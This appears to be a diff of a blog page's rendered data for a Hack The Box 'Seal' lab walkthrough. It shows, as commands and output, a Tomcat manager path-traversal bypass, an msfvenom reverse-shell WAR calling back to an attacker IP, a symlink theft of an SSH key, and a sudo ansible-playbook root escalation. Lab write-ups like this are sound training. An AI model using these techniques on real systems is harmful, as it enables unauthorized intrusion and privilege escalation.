@@ -1,31 +1,32 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-13:I[484,[],"OutletBoundary"]
-14:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Seal Walkthrough"}],["$","p",null,{"className":"article-dek","children":"GitBucket history exposes Tomcat credentials, a proxy path-normalization flaw permits WAR deployment, and an Ansible backup symlink steals a user's SSH key before sudo access to playbooks yields root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:06:37.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-seal-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Seal machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Seal machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$Lf",null,{"headings":[{"id":"enumeration","label":"Enumeration"},{"id":"initial-reconnaissance","label":"Initial Reconnaissance"},{"id":"gitbucket-history","label":"GitBucket history"},{"id":"tomcat-manager-access-via-path-traversal","label":"Tomcat Manager Access via Path Traversal"},{"id":"foothold-war-reverse-shell","label":"Foothold - WAR Reverse Shell"},{"id":"lateral-movement-to-user-luis","label":"Lateral Movement to User (luis)"},{"id":"privilege-escalation-to-root","label":"Privilege Escalation to Root"},{"id":"flags","label":"Flags"},{"id":"lessons-learned","label":"Lessons learned"},{"id":"tools-used","label":"Tools Used"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit f7f46a4b549d",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Seal, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-10:T5f93,<p><strong>Machine:</strong> Seal<br><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Medium<br><strong>IP:</strong> <code>10.129.95.190</code><br><strong>Attacker IP:</strong> <code>10.10.17.27</code>  </p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+14:I[484,[],"OutletBoundary"]
+15:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Seal Walkthrough"}],["$","p",null,{"className":"article-dek","children":"GitBucket history exposes Tomcat credentials, a proxy path-normalization flaw permits WAR deployment, and an Ansible backup symlink steals a user's SSH key before sudo access to playbooks yields root."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"Seal"}],"$L5","$L6"]}],"$L7","$L8"],null,null]}]]}],"$L9"]}],"$La","$Lb"]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","small",null,{"children":"Hack The Box machine record"}]
+6:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+7:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Medium"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+8:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+9:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-seal-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Seal machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Seal machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+a:["$","div",null,{"className":"article-rule"}]
+11:T656e,<p><strong>Machine:</strong> Seal<br><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Medium<br><strong>IP:</strong> <code>10.129.95.190</code><br><strong>Attacker IP:</strong> <code>10.10.17.27</code>  </p>
 <hr>
 
 
 
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="step-1-add-target-to-etc-hosts">Step 1: Add target to /etc/hosts</h3>
-<pre><code class="language-bash" data-language="bash">echo "10.129.95.190 seal.htb" | sudo tee -a /etc/hosts
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">echo "10.129.95.190 seal.htb" | sudo tee -a /etc/hosts
 </code></pre>
 <p> The SSL certificate on port 443 reveals the hostname <code>seal.htb</code>. Many web applications perform virtual host routing based on the <code>Host</code> header. Without this DNS mapping, we might miss important functionality or get redirected to invalid domains.</p>
 <p> <em>Check SSL certificates.</em> They often contain domain names, organization info, and sometimes even email addresses that expand your attack surface. This is passive reconnaissance at its finest.</p>
 <hr>
 <h3 id="step-2-service-discovery-nmap">Step 2: Service Discovery (Nmap)</h3>
-<pre><code class="language-bash" data-language="bash">nmap -sV -v -p- --min-rate=10000 10.129.95.190
+<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">nmap -sV -v -p- --min-rate=10000 10.129.95.190
 </code></pre>
 <p><strong>Results:</strong></p>
 <ul>
@@ -95,14 +96,14 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 </ol>
 <p>Click the <strong>older</strong> commit (<code>ac21032</code>) to view the diff.</p>
 <p><strong>Finding:</strong></p>
-<pre><code class="language-xml" data-language="xml">&lt;user username="tomcat" password="REDACTED" roles="manager-gui,admin-gui"/&gt;
+<pre tabindex="0" aria-label="xml code or terminal block 3"><code class="language-xml" data-language="xml">&lt;user username="tomcat" password="REDACTED" roles="manager-gui,admin-gui"/&gt;
 </code></pre>
 <p><strong>Mechanism:</strong> The developers added the configuration with credentials, then later "updated" it to remove the credentials. But Git preserves the entire history.</p>
 <p> <em>Review the implementation.</em> When you see "updating" a config file, ask yourself: "What was updated?" Often, "updates" are actually security fixes - which means the old version had a vulnerability (or credential) that you can exploit.</p>
 <hr>
 <h3 id="step-9-verify-tomcat-manager-access">Step 9: Verify Tomcat Manager Access</h3>
 <p>With credentials in hand, try accessing the Tomcat Manager:</p>
-<pre><code class="language-bash" data-language="bash">curl -k -u REDACTED https://seal.htb/manager/html
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">curl -k -u REDACTED https://seal.htb/manager/html
 </code></pre>
 <p><strong>Result:</strong> 403 Forbidden</p>
 <p><strong>But wait!</strong> We can access other endpoints:</p>
@@ -131,7 +132,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <hr>
 <h3 id="step-11-access-the-manager-via-bypass">Step 11: Access the Manager via Bypass</h3>
 <p><strong>Browser:</strong></p>
-<pre><code>https://seal.htb/manager/status/..;/html
+<pre tabindex="0" aria-label="Code or terminal block 5"><code>https://seal.htb/manager/status/..;/html
 </code></pre>
 <p><strong>Authentication:</strong></p>
 <ul>
@@ -140,7 +141,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 </ul>
 <p><strong>Result:</strong> Full access to the Tomcat Web Application Manager!</p>
 <p><strong>Alternative bypass paths that also work:</strong></p>
-<pre><code>https://seal.htb/manager/..;/html
+<pre tabindex="0" aria-label="Code or terminal block 6"><code>https://seal.htb/manager/..;/html
 https://seal.htb/manager/foo/..;/html
 https://seal.htb/admin/foo/..;/dashboard/
 </code></pre>
@@ -149,14 +150,14 @@ https://seal.htb/admin/foo/..;/dashboard/
 <h2 id="foothold-war-reverse-shell">Foothold - WAR Reverse Shell</h2>
 <h3 id="step-12-generate-a-war-reverse-shell">Step 12: Generate a WAR Reverse Shell</h3>
 <p>On Kali:</p>
-<pre><code class="language-bash" data-language="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.27 LPORT=4444 -f war -o shell.war
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.27 LPORT=4444 -f war -o shell.war
 </code></pre>
 <p><strong>Why a WAR file:</strong> Tomcat's primary deployment format is WAR (Web Application Archive). The manager interface allows uploading WAR files, which Tomcat automatically deploys as running web applications.</p>
 <p> <em>Use the platform's native deployment mechanism.</em> Tomcat is designed to deploy WARs. Instead of trying to exploit a buffer overflow or SQL injection, we're simply using Tomcat's legitimate functionality - but with a malicious payload. This is much more reliable.</p>
 <hr>
 <h3 id="step-13-start-the-listener">Step 13: Start the Listener</h3>
 <p>On Kali:</p>
-<pre><code class="language-bash" data-language="bash">nc -nlvp 4444
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">nc -nlvp 4444
 </code></pre>
 <p>Leave this running in a separate terminal.</p>
 <hr>
@@ -179,7 +180,7 @@ https://seal.htb/admin/foo/..;/dashboard/
 <li>Forward the request</li>
 </ol>
 <p><strong>Method 3: curl (after obtaining a fresh CSRF nonce)</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -k -u REDACTED \
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">curl -k -u REDACTED \
   'https://seal.htb/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=YOUR_NONCE' \
   -F 'deployWar=@/home/kali/Downloads/seal/shell.war' \
   -F 'deployPath=/shell'
@@ -190,14 +191,14 @@ https://seal.htb/admin/foo/..;/dashboard/
 <h3 id="step-15-trigger-the-shell">Step 15: Trigger the Shell</h3>
 <p>Visit <code>https://seal.htb/shell/</code> in the browser (or click the <code>/shell</code> application in the manager).</p>
 <p><strong>On your Kali listener:</strong></p>
-<pre><code>connect to [10.10.17.27] from (UNKNOWN) [10.129.95.190] 44888
+<pre tabindex="0" aria-label="Code or terminal block 10"><code>connect to [10.10.17.27] from (UNKNOWN) [10.129.95.190] 44888
 id
 uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 </code></pre>
 <p> <em>Trigger the payload.</em> Many people deploy shells but forget to trigger them. A WAR shell needs an HTTP request to execute the JSP payload. Simply visiting the application's root URL is enough.</p>
 <hr>
 <h3 id="step-16-stabilize-the-shell">Step 16: Stabilize the Shell</h3>
-<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 </code></pre>
 <p>Then press <strong>Ctrl+Z</strong> on Kali, run <code>stty raw -echo; fg</code>, and press Enter twice.</p>
@@ -205,7 +206,7 @@ export TERM=xterm
 <hr>
 <h2 id="lateral-movement-to-user-luis">Lateral Movement to User (luis)</h2>
 <h3 id="step-17-initial-enumeration-as-tomcat">Step 17: Initial Enumeration as <code>tomcat</code></h3>
-<pre><code class="language-bash" data-language="bash">ls -la /home/
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">ls -la /home/
 ps aux | grep -i backup
 </code></pre>
 <p><strong>Key Findings:</strong></p>
@@ -217,10 +218,10 @@ ps aux | grep -i backup
 <p> <em>Processes reveal everything.</em> <code>ps aux</code> is one of the most powerful commands for privilege escalation. It shows you what's running, as whom, and with what arguments. A root process that runs <code>sudo -u luis ansible-playbook</code> is immediately suspicious - it's a privileged action being performed on behalf of a lower-privileged user.</p>
 <hr>
 <h3 id="step-18-analyze-the-ansible-playbook">Step 18: Analyze the Ansible Playbook</h3>
-<pre><code class="language-bash" data-language="bash">cat /opt/backups/playbook/run.yml
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">cat /opt/backups/playbook/run.yml
 </code></pre>
 <p><strong>Content:</strong></p>
-<pre><code class="language-yaml" data-language="yaml">- hosts: localhost
+<pre tabindex="0" aria-label="yaml code or terminal block 14"><code class="language-yaml" data-language="yaml">- hosts: localhost
   tasks:
   - name: Copy Files
     synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
@@ -239,17 +240,17 @@ ps aux | grep -i backup
 <p>Following attacker-controlled symlinks lets a privileged process read or write unintended files.</p>
 <hr>
 <h3 id="step-19-identify-writable-directories-in-the-backup-source">Step 19: Identify Writable Directories in the Backup Source</h3>
-<pre><code class="language-bash" data-language="bash">ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
 </code></pre>
 <p><strong>Permissions:</strong></p>
-<pre><code>drwxr-xr-x 7 root root 4096 May  7  2021 .
+<pre tabindex="0" aria-label="Code or terminal block 16"><code>drwxr-xr-x 7 root root 4096 May  7  2021 .
 drwxrwxrwx 2 root root 4096 May  7  2021 uploads
 </code></pre>
 <p><strong>Key Finding:</strong> <code>uploads</code> is <code>drwxrwxrwx</code> - world-writable!</p>
 <p> <em>World-writable directories in backup scopes are gold.</em> If a privileged backup process copies a world-writable directory, and that process follows symlinks, you can make it read ANY file that the backup process's user can read.</p>
 <hr>
 <h3 id="step-20-create-the-symlink-trap">Step 20: Create the Symlink Trap</h3>
-<pre><code class="language-bash" data-language="bash">cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
 ln -s /home/luis/.ssh luis-ssh
 ls -la
 </code></pre>
@@ -258,10 +259,10 @@ ls -la
 <hr>
 <h3 id="step-21-wait-for-the-backup-and-extract-the-key">Step 21: Wait for the Backup and Extract the Key</h3>
 <p><strong>Monitor for new backups:</strong></p>
-<pre><code class="language-bash" data-language="bash">ls -la /opt/backups/archives/
+<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">ls -la /opt/backups/archives/
 </code></pre>
 <p>When a new <code>.gz</code> file appears with a recent timestamp, copy and extract it:</p>
-<pre><code class="language-bash" data-language="bash">cp /opt/backups/archives/backup-YYYY-MM-DD-HH:MM:SS.gz /tmp/backup.gz
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">cp /opt/backups/archives/backup-YYYY-MM-DD-HH:MM:SS.gz /tmp/backup.gz
 cd /tmp
 gunzip backup.gz
 tar -xf backup
@@ -272,13 +273,13 @@ cat dashboard/uploads/luis-ssh/id_rsa
 <hr>
 <h3 id="step-22-ssh-as-luis">Step 22: SSH as <code>luis</code></h3>
 <p>On Kali, save the key:</p>
-<pre><code class="language-bash" data-language="bash">nano luis_id_rsa
+<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">nano luis_id_rsa
 # Paste the key
 chmod 600 luis_id_rsa
 ssh -i luis_id_rsa luis@seal.htb
 </code></pre>
 <p><strong>Verify access:</strong></p>
-<pre><code class="language-bash" data-language="bash">whoami
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">whoami
 # luis
 cat /home/luis/user.txt
 # abd4808[redacted]ee3469108
@@ -287,10 +288,10 @@ cat /home/luis/user.txt
 <hr>
 <h2 id="privilege-escalation-to-root">Privilege Escalation to Root</h2>
 <h3 id="step-23-check-sudo-permissions">Step 23: Check sudo Permissions</h3>
-<pre><code class="language-bash" data-language="bash">sudo -l
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">sudo -l
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>User luis may run the following commands on seal:
+<pre tabindex="0" aria-label="Code or terminal block 23"><code>User luis may run the following commands on seal:
     (ALL) NOPASSWD: /usr/bin/ansible-playbook *
 </code></pre>
 <p><strong>Translation:</strong> Luis can run <strong>any</strong> Ansible playbook as <strong>root</strong> without a password.</p>
@@ -299,7 +300,7 @@ cat /home/luis/user.txt
 <h3 id="step-24-exploit-ansible-playbook-for-root">Step 24: Exploit Ansible-Playbook for Root</h3>
 <p><strong>Mechanism:</strong> Ansible playbooks are YAML files that define tasks to be executed on target hosts. When run with <code>sudo</code>, those tasks execute as root. By creating a playbook that runs <code>chmod +s /bin/bash</code>, we grant ourselves a SUID root shell.</p>
 <p><strong>Create the malicious playbook:</strong></p>
-<pre><code class="language-bash" data-language="bash">cd /dev/shm
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">cd /dev/shm
 cat &gt; root.yml &lt;&lt; 'EOF'
 - hosts: localhost
   tasks:
@@ -308,16 +309,16 @@ cat &gt; root.yml &lt;&lt; 'EOF'
 EOF
 </code></pre>
 <p><strong>Execute it:</strong></p>
-<pre><code class="language-bash" data-language="bash">sudo /usr/bin/ansible-playbook root.yml
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">sudo /usr/bin/ansible-playbook root.yml
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>TASK [pwn] ********************************************************************
+<pre tabindex="0" aria-label="Code or terminal block 26"><code>TASK [pwn] ********************************************************************
 changed: [localhost]
 </code></pre>
 <p> <em>GTFOBins is your bible.</em> Ansible-playbook is listed on GTFOBins as a sudo exploitation vector. Whenever you see a command with <code>NOPASSWD</code> and a wildcard, check GTFOBins immediately.</p>
 <hr>
 <h3 id="step-25-spawn-root-shell">Step 25: Spawn Root Shell</h3>
-<pre><code class="language-bash" data-language="bash">/bin/bash -p
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">/bin/bash -p
 whoami
 # root
 cat /root/root.txt
@@ -372,9 +373,9 @@ cat /root/root.txt
 <li><code>python3 pty</code> - Shell stabilization</li>
 <li><code>ansible-playbook</code> - Root privilege escalation</li>
 </ul>
-<hr>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
-b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-search-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Search Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:07:39.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-querier-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Querier Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:04:41.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
